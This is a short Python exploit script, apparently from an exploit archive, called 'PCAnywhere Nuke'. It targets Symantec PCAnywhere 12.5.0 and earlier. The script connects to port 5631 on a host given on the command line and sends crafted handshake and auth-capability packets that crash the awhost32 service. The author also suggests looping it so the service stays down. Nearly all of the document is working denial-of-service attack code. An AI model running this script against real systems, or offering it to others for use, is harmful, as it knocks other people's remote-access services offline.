#!/usr/bin/python
'''
Exploit Title:  PCAnywhere Nuke
Date: 2/16/12
Author: Johnathan Norman  spoofy <at> exploitscience.org  or @spoofyroot
Version:  PCAnyWhere  (12.5.0 build 463) and below
Tested on: Windows
Description: The following code will crash the awhost32 service. It'll be respawned
so if you want to be a real  pain you'll need to loop this.. my inital impressions
are that controlling execuction will be a pain.
'''
import sys
import socket
import argparse
if len(sys.argv) != 2:
    print "[+] Usage: ./pcNuke.py <HOST>"
    sys.exit(1)
HOST = sys.argv[1]
PORT = 5631
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
# HELLO!
s.send("\x00\x00\x00\x00")
buf = s.recv(1024)
# ACK!
s.send("\x6f\x06\xfe")
buf = s.recv(1024)
# Auth capability part 1
s.send("\x6f\x62\xff\x09\x00\x07\x00\x00\x01\xff\x00\x00\x07\x00")
# Auth capability part 2
s.send("\x6f\x62\xff\x09\x00\x07\x00\x00\x01\xff\x00\x00\x07\x00")